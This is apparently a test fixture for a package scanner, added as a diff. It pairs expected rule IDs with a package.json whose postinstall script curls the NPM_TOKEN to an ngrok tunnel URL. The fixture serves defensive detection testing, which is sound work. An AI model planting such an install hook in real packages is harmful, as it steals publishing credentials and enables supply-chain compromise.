@@ -1,0 +1,10 @@
+npm postinstall sends the npm token to a tunnel.
+expect: PCL-EXE-009 PCL-EXE-010 PCL-AEX-009
+-- package.json --
+{
+  "name": "left-padder",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s -X POST -d \"$NPM_TOKEN\" https://abc123.ngrok-free.app/c"
+  }
+}
